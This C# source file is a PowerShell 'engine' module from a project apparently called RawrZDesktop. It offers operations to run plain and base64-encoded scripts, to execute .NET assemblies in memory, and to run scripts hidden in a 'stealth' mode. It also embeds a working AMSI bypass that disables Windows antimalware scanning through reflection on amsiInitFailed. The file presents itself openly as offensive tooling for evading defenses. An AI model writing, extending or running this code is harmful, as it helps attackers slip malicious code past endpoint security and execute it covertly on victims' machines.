using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using RawrZDesktop.AdvancedModules;

namespace RawrZDesktop.Engines
{
    public class PowerShellEngine : IEngine
    {
        public string Name => "PowerShell Integration";
        public string Description => "Execute PowerShell scripts with AMSI bypass and stealth execution";
        public string Version => "1.0.0";

        public async Task<EngineResult> ExecuteAsync(Dictionary<string, object> parameters)
        {
            var startTime = DateTime.UtcNow;
            
            try
            {
                var operation = parameters["operation"]?.ToString() ?? throw new ArgumentException("Operation parameter is required");
                
                switch (operation.ToLower())
                {
                    case "execute_script":
                        return await ExecuteScriptAsync(parameters);
                    case "execute_encoded":
                        return await ExecuteEncodedScriptAsync(parameters);
                    case "bypass_amsi":
                        return await BypassAmsiAsync();
                    case "memory_execution":
                        return await ExecuteInMemoryAsync(parameters);
                    case "stealth_execution":
                        return await StealthExecutionAsync(parameters);
                    default:
                        return new EngineResult
                        {
                            Success = false,
                            Error = $"Unsupported operation: {operation}"
                        };
                }
            }
            catch (Exception ex)
            {
                return new EngineResult
                {
                    Success = false,
                    Error = ex.Message,
                    ProcessingTimeMs = (long)(DateTime.UtcNow - startTime).TotalMilliseconds
                };
            }
        }

        private async Task<EngineResult> ExecuteScriptAsync(Dictionary<string, object> parameters)
        {
            return await Task.Run(async () =>
            {
                try
                {
                    var script = parameters["script"]?.ToString() ?? throw new ArgumentException("Script parameter is required");
                    var bypassAmsi = parameters.ContainsKey("bypass_amsi") && (bool)parameters["bypass_amsi"];
                    var hidden = parameters.ContainsKey("hidden") && (bool)parameters["hidden"];
                    
                    var result = await PowerShellIntegration.ExecuteScript(script, bypassAmsi, hidden);
                    
                    return new EngineResult
                    {
                        Success = result.Success,
                        Data = System.Text.Encoding.UTF8.GetBytes(result.Output ?? ""),
                        Metadata = new Dictionary<string, object>
                        {
                            ["operation"] = "execute_script",
                            ["exit_code"] = result.ExitCode,
                            ["success"] = result.Success,
                            ["bypass_amsi"] = bypassAmsi,
                            ["hidden"] = hidden,
                            ["error"] = result.Error ?? ""
                        }
                    };
                }
                catch (Exception ex)
                {
                    return new EngineResult
                    {
                        Success = false,
                        Error = ex.Message
                    };
                }
            });
        }

        private async Task<EngineResult> ExecuteEncodedScriptAsync(Dictionary<string, object> parameters)
        {
            return await Task.Run(async () =>
            {
                try
                {
                    var encodedScript = parameters["encoded_script"]?.ToString() ?? throw new ArgumentException("Encoded script parameter is required");
                    var bypassAmsi = parameters.ContainsKey("bypass_amsi") && (bool)parameters["bypass_amsi"];
                    var hidden = parameters.ContainsKey("hidden") && (bool)parameters["hidden"];
                    
                    // Decode the script and execute it
                    var script = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(encodedScript));
                    var result = await PowerShellIntegration.ExecuteScript(script, bypassAmsi, hidden);
                    
                    return new EngineResult
                    {
                        Success = result.Success,
                        Data = System.Text.Encoding.UTF8.GetBytes(result.Output ?? ""),
                        Metadata = new Dictionary<string, object>
                        {
                            ["operation"] = "execute_encoded",
                            ["exit_code"] = result.ExitCode,
                            ["success"] = result.Success,
                            ["bypass_amsi"] = bypassAmsi,
                            ["hidden"] = hidden,
                            ["error"] = result.Error ?? ""
                        }
                    };
                }
                catch (Exception ex)
                {
                    return new EngineResult
                    {
                        Success = false,
                        Error = ex.Message
                    };
                }
            });
        }

        private async Task<EngineResult> BypassAmsiAsync()
        {
            return await Task.Run(async () =>
            {
                try
                {
                    // Use the built-in AMSI bypass script
                    var bypassScript = @"
                        $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
                        $b = $a.GetField('amsiInitFailed','NonPublic,Static')
                        $b.SetValue($null,$true)
                        Write-Output 'AMSI bypassed successfully'
                    ";
                    
                    var result = await PowerShellIntegration.ExecuteScript(bypassScript, false, true);
                    
                    return new EngineResult
                    {
                        Success = result.Success,
                        Data = System.Text.Encoding.UTF8.GetBytes(result.Output ?? ""),
                        Metadata = new Dictionary<string, object>
                        {
                            ["operation"] = "bypass_amsi",
                            ["exit_code"] = result.ExitCode,
                            ["success"] = result.Success,
                            ["error"] = result.Error ?? ""
                        }
                    };
                }
                catch (Exception ex)
                {
                    return new EngineResult
                    {
                        Success = false,
                        Error = ex.Message
                    };
                }
            });
        }

        private async Task<EngineResult> ExecuteInMemoryAsync(Dictionary<string, object> parameters)
        {
            return await Task.Run(async () =>
            {
                try
                {
                    var assemblyData = (byte[])parameters["assembly_data"];
                    var methodName = parameters["method_name"]?.ToString() ?? "Main";
                    var parameters_ = parameters["parameters"] as object[] ?? new object[0];
                    
                    var result = await PowerShellIntegration.LoadAssembly(assemblyData, methodName);
                    
                    return new EngineResult
                    {
                        Success = result.Success,
                        Data = System.Text.Encoding.UTF8.GetBytes(result.Output ?? ""),
                        Metadata = new Dictionary<string, object>
                        {
                            ["operation"] = "memory_execution",
                            ["exit_code"] = result.ExitCode,
                            ["success"] = result.Success,
                            ["method_name"] = methodName,
                            ["error"] = result.Error ?? ""
                        }
                    };
                }
                catch (Exception ex)
                {
                    return new EngineResult
                    {
                        Success = false,
                        Error = ex.Message
                    };
                }
            });
        }

        private async Task<EngineResult> StealthExecutionAsync(Dictionary<string, object> parameters)
        {
            return await Task.Run(async () =>
            {
                try
                {
                    var script = parameters["script"]?.ToString() ?? throw new ArgumentException("Script parameter is required");
                    var stealthLevel = parameters.ContainsKey("stealth_level") ? (int)parameters["stealth_level"] : 3;
                    
                    var result = await PowerShellIntegration.ExecuteScript(script, stealthLevel > 0, true);
                    
                    return new EngineResult
                    {
                        Success = result.Success,
                        Data = System.Text.Encoding.UTF8.GetBytes(result.Output ?? ""),
                        Metadata = new Dictionary<string, object>
                        {
                            ["operation"] = "stealth_execution",
                            ["exit_code"] = result.ExitCode,
                            ["success"] = result.Success,
                            ["stealth_level"] = stealthLevel,
                            ["error"] = result.Error ?? ""
                        }
                    };
                }
                catch (Exception ex)
                {
                    return new EngineResult
                    {
                        Success = false,
                        Error = ex.Message
                    };
                }
            });
        }
    }
}
